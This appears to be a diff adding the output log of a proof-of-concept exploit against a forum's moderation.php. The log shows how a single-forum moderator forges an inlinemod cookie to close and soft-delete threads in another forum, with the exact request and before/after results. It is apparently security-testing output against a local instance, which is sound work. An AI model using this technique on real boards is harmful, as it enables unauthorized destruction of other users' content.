@@ -1,0 +1,18 @@
+========================================================================
+VULN-003: cross-forum inline moderation via client cookie
+Target: http://localhost:25850
+========================================================================
+[INFO] exercising moderation.php:1902 multiclosethreads — perm checks URL fid, acts on cookie tids
+[SETUP] forum A = 2 (attacker moderates); created forum B = 3 (attacker does NOT)
+[SETUP] victim thread tid=15 created in forum B (fid 3)
+[SETUP] attacker amod_69f46bb5 (uid=65, Registered) is a moderator of forum A (2) only
+[STEP] POST moderation.php multiclosethreads fid=2 with Cookie inlinemod_forum2=15
+[INFO] is_moderator(2) passes for the attacker; getids returns the forum-B tid unfiltered
+[INFO] HTTP 302; forum-B thread closed: before=0 after=1
+[PROOF] a moderator of forum A closed thread 15 in forum B (which they do NOT moderate) — authorization validated the URL fid, action hit a cookie-supplied cross-forum tid
+[STEP] POST moderation.php multisoftdeletethreads fid=2 (same cross-forum tid)
+[INFO] forum-B thread visible: before=1 after=-1 (-1 = soft-deleted)
+[PROOF] the same section mod SOFT-DELETED the cross-forum thread (destructive) — visible=-1
+------------------------------------------------------------------------
+[OK] exploit confirmed — cross-forum thread manipulation by a single-forum moderator
+==> VULN-003: CONFIRMED — section mod closes/soft-deletes threads board-wide via inlinemod cookie
